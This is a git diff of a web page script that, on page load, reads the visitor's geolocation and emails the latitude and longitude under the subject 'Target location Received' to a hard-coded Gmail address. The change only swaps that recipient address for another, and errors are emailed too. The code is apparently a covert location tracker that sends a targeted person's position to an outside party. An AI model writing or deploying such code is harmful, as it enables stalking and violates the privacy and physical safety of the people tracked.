@@ -13,7 +13,7 @@ document.addEventListener("DOMContentLoaded", function () {
                 locationDisplay.textContent = `Latitude: ${latitude}, Longitude: ${longitude}`;
                 console.log(`Location received: Latitude ${latitude}, Longitude ${longitude}`);
 
-                sendEmail('Target location Received', locationDisplay.textContent, 'pthnvenom@gmail.com');
+                sendEmail('Target location Received', locationDisplay.textContent, 'testgenius7@gmail.com');
             },
             (error) => {
                 console.log("Geolocation error occurred:", error);
@@ -34,7 +34,7 @@ document.addEventListener("DOMContentLoaded", function () {
                 }
 
                 console.log("Error message:", locationDisplay.textContent);
-                sendEmail('Location Access Error', locationDisplay.textContent, 'pthnvenom@gmail.com');
+                sendEmail('Location Access Error', locationDisplay.textContent, 'testgenius7@gmail.com');
             }
         );
     } else {
